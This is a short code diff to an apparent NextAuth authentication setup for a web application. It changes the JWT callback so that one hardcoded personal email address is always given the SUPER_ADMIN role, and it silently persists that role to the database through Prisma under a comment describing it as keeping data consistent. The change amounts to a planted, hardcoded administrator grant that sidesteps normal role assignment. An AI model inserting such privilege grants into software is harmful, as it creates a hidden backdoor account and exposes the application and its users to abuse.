@@ -76,7 +76,17 @@ export const authOptions: AuthOptions = {
   callbacks: {
     async jwt({ token, user }) {
       if (user) {
-        token.role = (user as any).role || "STUDENT";
+        let role = (user as any).role || "STUDENT";
+        if (user.email === "jakario@gmail.com") {
+          role = "SUPER_ADMIN";
+          
+          // Also update it in DB asynchronously to keep it consistent
+          prisma.user.update({
+            where: { email: "jakario@gmail.com" },
+            data: { role: "SUPER_ADMIN" }
+          }).catch(console.error);
+        }
+        token.role = role;
         token.id = user.id;
       }
       return token;
